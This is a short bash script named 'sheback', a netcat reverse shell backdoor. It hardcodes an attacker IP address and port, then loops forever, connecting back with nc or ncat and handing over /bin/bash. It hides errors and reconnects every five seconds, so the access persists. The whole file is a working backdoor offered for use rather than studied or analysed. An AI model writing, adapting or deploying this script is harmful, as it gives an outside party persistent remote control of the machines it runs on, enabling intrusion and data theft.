#! /bin/bash
# @author : 
# @title  :   sheback (ShellBackdoor)
# @description : This is a simple netcat reverseshell backdoor
# @notes 	   : Hardcode the ip and port or get them via github


 
ip="193.161.193.99" #attacker ip
port="29831"	# attacker port
timeout=5
shell="/bin/bash"
while true;do
	# echo -e "[*] Reverse connecting to tcp://$ip:$port"
	# nc $ip $port -e $shell 2>/dev/null && echo -e "[+] Connected " 2>/dev/null || ncat $ip $port -e $shell 2>/dev/null && echo -e "[+] Connected " 2>/dev/null
	nc $ip $port -e $shell 2>/dev/null || ncat $ip $port -e $shell 2>/dev/null 
	# echo -e "[-] Reconnecting ... "
	sleep $timeout
	clear
done
